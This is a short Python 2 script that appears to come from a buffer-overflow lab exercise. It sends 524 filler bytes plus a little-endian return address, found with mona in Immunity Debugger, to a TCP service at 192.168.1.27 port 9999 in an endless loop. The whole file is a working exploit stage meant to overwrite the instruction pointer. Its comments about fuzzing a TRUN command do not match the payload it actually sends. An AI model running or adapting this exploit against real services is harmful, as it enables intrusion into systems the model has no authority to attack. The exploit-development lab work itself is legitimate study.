#!/usr/bin/python

import sys, socket

# 311712f3   <==return address from mona in Immunity Debugger 

shellcode = "A" * 524 + "\xf3\x12\x17\x31"     # adding the return address in little Endian format used for x86 arch

while True:
    try: 
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('192.168.1.27',9999))                    #change to match the IP and port# of the application you are fuzzing

            s.send((shellcode))                     #change TRUN to be the command you are Fuzzing
            s.close()

    except: 
            print "Error connecting to Server."
            sys.exit()
            